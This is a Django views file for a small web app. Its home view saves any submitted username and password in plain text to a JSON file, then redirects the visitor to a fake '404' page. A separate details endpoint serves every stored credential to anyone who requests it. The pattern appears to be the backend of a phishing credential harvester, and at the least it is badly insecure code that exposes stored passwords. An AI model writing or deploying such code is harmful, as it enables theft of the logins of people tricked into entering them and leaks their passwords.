from django.shortcuts import render, redirect
import json
from django.http import JsonResponse
# Create your views here.
def home(request):
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        new_user = [{'username': username, 'password': password}]
        
        with open('main/details.json', 'r') as json_file:
            existing_data = json.load(json_file)
        
        existing_data.extend(new_user)

        with open('main/details.json', 'w') as json_file:
            json.dump(existing_data, json_file, indent=4)

        return redirect('404')
    
    return render(request,'index.html')

def error(request):
    return render(request, '404.html')

def details(request):
    with open('main/details.json', 'r') as json_file:
        data = json.load(json_file)
    return JsonResponse(data, safe=False)

def main(request):
    return render(request, 'main.html')